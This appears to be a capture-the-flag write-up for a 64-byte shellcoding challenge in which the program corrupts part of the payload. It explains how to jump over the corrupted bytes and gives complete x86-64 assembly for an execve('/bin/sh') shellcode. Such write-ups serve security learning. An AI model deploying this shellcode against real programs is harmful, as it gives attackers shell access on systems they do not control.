This is a classic shellcoding challenge. After sending the shellcode, a part of it is intentionally corrupted by the program (via a `memset(sc + 0x10, 0xff, 0x10)`).

The shellcode is limited to 64 bytes. The solution is split a regular `execve("/bin/sh", NULL, NULL)` in 2 parts, and place a NOP sled in the middle of the shellcode.

Example shellcode (GNU `as` compatible):

```
xor rax, rax
push rax
push rax
pop rsi
pop rdx
mov al, 0x3b
        
jmp next
.fill 28,1,0x90
        
next:

mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
syscall
```
